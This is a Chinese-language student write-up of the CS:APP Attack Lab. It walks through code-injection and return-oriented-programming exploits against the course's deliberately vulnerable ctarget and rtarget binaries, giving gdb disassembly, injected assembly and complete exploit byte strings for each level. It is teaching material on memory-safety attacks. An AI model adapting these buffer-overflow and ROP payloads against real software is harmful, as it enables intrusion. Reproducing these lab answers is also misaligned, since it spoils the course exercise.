# Attack Lab

[CSAPP:Attack lab - 简书 (jianshu.com)](https://www.jianshu.com/p/db731ca57342)

## 代码注入攻击

### level 1

反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。

- test

![image-20211126104027322](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261040430.png)

- getbuf

![image-20211126104154718](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261041743.png)

- touch1

```assembly
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:		sub    $0x8,%rsp
   0x00000000004017c4 <+4>:		movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

查看touch1的地址，用touch1的地址覆盖原来的返回地址

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

将每个字节的十六进制表示通过hex2raw转换为字符串，并将得到的字符串作为ctarget的输入。

![image-20211127184819454](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271848491.png)



### level 2

插入一段代码作为攻击字符串（exploit string）的一部分。

设置断点，查看栈顶地址。

```shell
(gdb) break getbuf
(gdb) run -q
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
(gdb) print /x $rsp
$1 = 0x5561dca0
(gdb) stepi
14	in buf.c
(gdb) print /x $rsp
$2 = 0x5561dc78
```

![image-20211126105412037](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261054068.png)

touch2需要接受一个参数，这个参数需要与cookie值相同，函数的第一个参数通过寄存器%rdi传递，同时设置完参数后需要将控制流转移到touch2，查看touch2的开始地址。

![image-20211127190235909](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271902954.png)

因此汇编代码，将touch2的地址压入栈顶，ret会弹出栈顶元素作为返回地址。

```assembly
movq  $0x59b997fa, %rdi		
pushq $0x4017ec                
ret
```
对汇编代码汇编生成目标文件，对目标代码反汇编，得到指令序列的字节表示
```shell
gcc -c level2.s
objdump -d level2.o > level2.d
```

![image-20211127190828639](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271908668.png)

得到攻击字符串的字节序列：

```
48 c7 c7 fa 97 b9 59 68 ec 17     
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00			/* 栈顶地址0x5561dc78 */
```

验证

```
./hex2raw < solution2.txt | ./ctarget -q
```

![image-20211127191142818](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271911851.png)

### level3

touch3函数接受一个指向字符数组首地址的指针作为参数

![image-20211127195837095](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271958123.png)

hexmatch接受cookie和字符数组作为参数，将cookie转化为字符串“59b997fa”，字符串的最后会有一个空字符/0作为结束符，十六进制表示为00，strncmp函数比较了9个字符，因此在字符数组后面跟上结束符00

![image-20211127200218526](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272002553.png)

查看getbuf，在函数返回前会修改栈顶的位置，释放占用的栈空间，而此时通过转移程序控制流执行touch3函数，调用hexmatch时会在栈上分配空间，因此touch3的参数指向的字符数组位置不能放在getbuf申请的占空间上。

![image-20211126104154718](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272003989.png)

test的栈空间之后不会用到，因此将cookie的字符数组表示放在test的栈空间中。cookie为0x59b997fa，表示为十六进制为35 39 62 39 39 37 66 61 00，栈空间组织如下。

![image-20211127204653792](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272046849.png)

getbuf栈空间应该执行的汇编代码：将字符数组的首地址通过%rdi寄存器传递给函数touch3，同时设置返回地址为touch3的首地址

```assembly
movq $0x5561dca8, %rdi     
pushq $0x4018fa            
ret
```

生成指令字节序列

> gcc -c level3.s     将汇编代码变成机器代码
>
> objdump -d level3.o >level3.d  将机器代码反编译成汇编代码

![image-20211127205117537](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272051563.png)

对应攻击字符串的字节序列

```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00             
35 39 62 39 39 37 66 61
00
```

验证

```
./hex2raw < solution3.txt | ./ctarget -q
```

![image-20211127205424905](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272054939.png)

## ROP攻击

在rtarget中，采用了两种方法来对抗栈溢出攻击：

- 栈随机化

  设置断点，运行两次查看%rsp栈顶的值，发现其值发生变化。这意味着无法知道getbuf申请栈空间后的栈顶值，从而无法将我们的可执行代码的字节序列以字符串的形式插入到相应的位置。

  ![image-20211128192038064](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281920181.png)

- 限制可执行代码区域，栈为不可执行区域

rtarget中没有进行栈破坏检测，因此可以通过破话test的栈帧来达到幸运的目的。

### level2

touch2接受一个参数，需要通过寄存器%rdi来传递，因此可以先把cookie值存放在栈中，通过popq指令获得这个值。

![image-20211128193143591](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281931624.png)

根据提示，在start_farm和end_farm中查找满足要求的指令编码：

指令编码需要满足一定要求，nop的指令编码为0x90，ret的指令编码为0xc3，我们通过popq指令或许栈顶的值后，不能有其他的无效指令或者别的指令对结果造成影响。

因此，如果指令为popq %rax，可以寻找的指令编码为 58 （90） c3，可以找到两处符合要求的。

![image-20211128194353528](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281943601.png)

最后的结果时可以找到popq %rdi，直接将想应的值送到%rdi寄存器，查找5f (90) c3，没有找到符合的结果，因此只能先将cookie值传递到一个中间寄存器，在传递到%rdi寄存器中。

![image-20211128194608732](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281946805.png)

这一题只需要用到start_farm到mid_farm中的指令编码，通过查找，找到

```assembly
 0x4019cc       58 		popq %rax
                90		nop
                c3		ret
```

这样的话，通过查看movq指令的编码，需要查找的指令编码为48 89 c7 (90) c3

![image-20211128195027771](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281950804.png)

这里可以找到两个符合要求的结果：

![image-20211128195203377](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281952447.png)

使用的指令编码为

```assembly
0x4019a2	48 89 c7	movq %rax, %rdi
			c3			ret
```

因此栈可以组织如下：

当getbuf函数返回时，返回地址为0x4019cc，同时栈顶为红色位置。

在0x4019cc，执行popq %rax操作，此时栈顶指向的值为0x4019a2，执行ret指令，将这个值作为返回地址。

执行完0x4019a2处的指令后，将0x4017ec作为返回地址，执行touch2。

![image-20211128201044882](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282010992.png)

对应攻击字符串的字节序列：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00           /* popq %rax */
fa 97 b9 59 00 00 00 00           /* cookie    */
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

![image-20211128201617892](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282016927.png)

### level3

同代码注入攻击的level3，需要将cookie的字符串十六进制表示存储在某一位置，这一位置不能在getbuf栈帧中，因此需要在test栈帧中。其表示需要占用9个字节，可以考虑放在最近的位置，也就是返回地址的上面，返回地址是我们第一个可以操作的地方，这是要得到%rsp，即cookie字符串首地址的值。movq %rsp, D的指令编码为48 89 eX(X不确定)，查找：

可以查找到相关指令编码，这时栈顶指向字符串的首地址，而字符串占了两个8字节，后面需要跟两个pop指令让栈顶指向后面的位置，在后面的位置我们可以操作填上其他的地址，以供ret指令返回到相应的位置，但查找不到想应的指令序列。

![image-20211128202754741](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282027821.png)

不能通过栈顶地址确定cookie字符串的地址，则cookie可以放在之后的位置，通过首地址+偏移量来确定其位置，但此时依旧需要先确定栈顶位置，并保存其值，因此先查找48 89 eX，看可以使用的指令编码：

找到的序列只有48 89 e0 c3可以满足要求，对应指令movq %rsp, %rax。现在看通过%rax可以将值传递到哪个寄存器，查找48 49 cX：

只能找到48 89 c7，可以实现%rax -> %rdi，当前无法向下继续进行，查看另外两个指令编码。

![image-20211128205105364](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282051440.png)

根据实验提供的相应andb、orb、cmpb、testb指令可以指导出现这样的两个字节指令编码时不影响相关寄存器的值，因此存在于我们想要的指令后面。观察相应指令特征，来进行查找：

对于movl类指令查找：

| movl   | andb、orb、cmpb、testb             | ret  |
| ------ | ---------------------------------- | ---- |
| 89 ( ) | (20、08、38、84)  (c0、c9、d2、db) | c3   |

其中90也是不影响结果的，可以出现在相应中间位置。查找到的相关指令，可以看出可以实现%eax -> %edx -> %esi的传递。

![image-20211128204306609](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282043655.png)

同时之前level2可以找到popq %rax指令，因此可以将偏移量存放在栈中，通过pop指令来进行传递给%esi。然后可以基址+偏移量来确定地址。

![image-20211128205504176](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282055203.png)

现在还无法确定偏移量的值应该为多少，先通过之前的分析，确定程序的控制流：

![image-20211128211625690](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282116865.png)

可以确定偏移量为72=0x48

对应攻击字符串的字节序列：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
42 1a 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
```

![image-20211128211834719](https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282118763.png)